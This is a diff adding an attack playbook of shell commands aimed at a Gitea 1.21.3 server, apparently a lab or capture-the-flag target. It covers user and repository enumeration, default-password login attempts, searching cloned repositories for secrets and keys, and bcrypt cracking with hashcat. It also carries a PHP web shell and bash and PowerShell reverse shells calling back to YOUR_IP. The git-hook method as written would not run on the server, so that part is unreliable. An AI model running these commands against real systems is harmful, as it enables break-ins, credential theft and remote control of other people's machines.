@@ -1,0 +1,199 @@
+# SYSTEM 4: LOCK (Gitea) - Manual Commands
+# IP: 10.129.6.226
+# Target: Gitea 1.21.3 on port 3000
+
+# ============================================
+# PHASE 1: Check Gitea Status
+# ============================================
+
+# Check Gitea version
+curl -s http://10.129.6.226:3000/api/v1/version
+
+# Extract version
+curl -s http://10.129.6.226:3000/api/v1/version | grep -oP '"version":"\K[^"]*'
+
+# Check if registration is enabled
+curl -s http://10.129.6.226:3000/user/sign_up | grep -i "register\|sign.*up\|create.*account"
+
+# ============================================
+# PHASE 2: User Enumeration
+# ============================================
+
+# Search for users
+curl -s "http://10.129.6.226:3000/api/v1/users/search?q=admin"
+
+# Search for all users (starting with 'a')
+curl -s "http://10.129.6.226:3000/api/v1/users/search?q=a"
+
+# Enumerate public repositories
+curl -s "http://10.129.6.226:3000/api/v1/repos/search?limit=50"
+
+# Extract repository names
+curl -s "http://10.129.6.226:3000/api/v1/repos/search?limit=50" | grep -oP '"full_name":"\K[^"]*'
+
+# ============================================
+# PHASE 3: Authentication Attempts
+# ============================================
+
+# Get CSRF token first
+curl -s -c cookies.txt http://10.129.6.226:3000/user/login > login_page.html
+
+# Extract CSRF token
+CSRF=$(grep -oP 'name="_csrf" value="\K[^"]*' login_page.html)
+echo "CSRF Token: $CSRF"
+
+# Try admin/admin
+curl -s -X POST http://10.129.6.226:3000/user/login \
+    -d "user_name=admin&password=admin&_csrf=$CSRF" \
+    -b cookies.txt -c cookies.txt \
+    -L -o login_admin.html
+
+# Check if login successful
+grep -i "dashboard\|repositories\|settings\|logout" login_admin.html
+
+# Try admin/Password123
+curl -s -X POST http://10.129.6.226:3000/user/login \
+    -d "user_name=admin&password=Password123&_csrf=$CSRF" \
+    -b cookies.txt -c cookies.txt \
+    -L -o login_admin2.html
+
+# Try gitea/gitea
+curl -s -X POST http://10.129.6.226:3000/user/login \
+    -d "user_name=gitea&password=gitea&_csrf=$CSRF" \
+    -b cookies.txt -c cookies.txt \
+    -L -o login_gitea.html
+
+# Try administrator/administrator
+curl -s -X POST http://10.129.6.226:3000/user/login \
+    -d "user_name=administrator&password=administrator&_csrf=$CSRF" \
+    -b cookies.txt -c cookies.txt \
+    -L -o login_admin3.html
+
+# ============================================
+# PHASE 4: If Authenticated - Repository Mining
+# ============================================
+
+# Access user settings (if authenticated)
+curl -s -b cookies.txt "http://10.129.6.226:3000/user/settings" > user_settings.html
+
+# List your repositories
+curl -s -b cookies.txt "http://10.129.6.226:3000/api/v1/user/repos" > my_repos.txt
+
+# Clone a repository (replace USER and REPO)
+# git clone http://admin:password@10.129.6.226:3000/USER/REPO.git
+
+# Search for credentials in cloned repo
+# cd REPO
+# grep -r -i "password\|secret\|api.*key\|token" . | grep -v ".git"
+# find . -name ".env" -o -name "config.*" -o -name "*.key" | grep -v ".git"
+# find . -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" | grep -v ".git"
+
+# ============================================
+# PHASE 5: Git Hooks RCE (if authenticated)
+# ============================================
+
+# Method 1: Create repository and set up hook locally
+# 1. Login to Gitea: http://10.129.6.226:3000/user/login
+# 2. Create new repository
+# 3. Clone it:
+# git clone http://USER:PASS@10.129.6.226:3000/USER/REPO.git
+# cd REPO
+
+# 4. Create post-receive hook:
+# mkdir -p .git/hooks
+# cat > .git/hooks/post-receive << 'EOF'
+# #!/bin/bash
+# bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+# EOF
+# chmod +x .git/hooks/post-receive
+
+# 5. Commit and push:
+# git add .git/hooks/post-receive
+# git commit -m "Add hook"
+# git push
+
+# 6. Set up listener first: nc -lvp 4444
+
+# Method 2: Pre-receive hook (similar to above, use .git/hooks/pre-receive)
+
+# ============================================
+# PHASE 6: File Upload RCE (if authenticated)
+# ============================================
+
+# 1. Login to Gitea
+# 2. Create repository
+# 3. Upload a file with reverse shell payload
+# 4. Access it via web interface
+
+# Example: Create a PHP file (if PHP is available on server)
+# <?php system($_GET['cmd']); ?>
+
+# Or create a shell script:
+# #!/bin/bash
+# bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
+
+# ============================================
+# PHASE 7: Search for Exploits
+# ============================================
+
+# Search for Gitea exploits
+searchsploit gitea
+
+# Search for Gitea 1.21.x exploits
+searchsploit gitea 1.21
+
+# Search for Gitea 1.21.3 specifically
+searchsploit gitea 1.21.3
+
+# ============================================
+# PHASE 8: Hash Cracking (if hash found)
+# ============================================
+
+# Extract hash to file (replace with actual hash)
+echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > hash_to_crack.txt
+
+# Crack bcrypt hash
+hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt
+
+# Show cracked hash
+hashcat -m 3200 hash_to_crack.txt /usr/share/wordlists/rockyou.txt --show
+
+# ============================================
+# PHASE 9: Reverse Shell Payloads
+# ============================================
+
+# PowerShell Reverse Shell (Windows):
+# powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\"YOUR_IP\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Bash Reverse Shell:
+# bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
+
+# Set up listener:
+# nc -lvp 4444
+
+# ============================================
+# NOTES
+# ============================================
+
+# If you get a shell (Windows):
+# - whoami
+# - hostname
+# - systeminfo
+# - ipconfig /all
+# - net user
+# - net localgroup administrators
+# - dir C:\Users\*\Desktop\user.txt /s
+# - dir C:\Users\*\Desktop\root.txt /s
+# - type C:\Users\Public\user.txt
+# - type C:\Users\Administrator\Desktop\root.txt
+
+# Replace YOUR_IP with your Kali IP:
+# ip addr show tun0
+# or
+# ifconfig
+
+# For Git hooks, make sure to:
+# 1. Set up listener BEFORE pushing
+# 2. Use correct IP address
+# 3. Check firewall rules
+
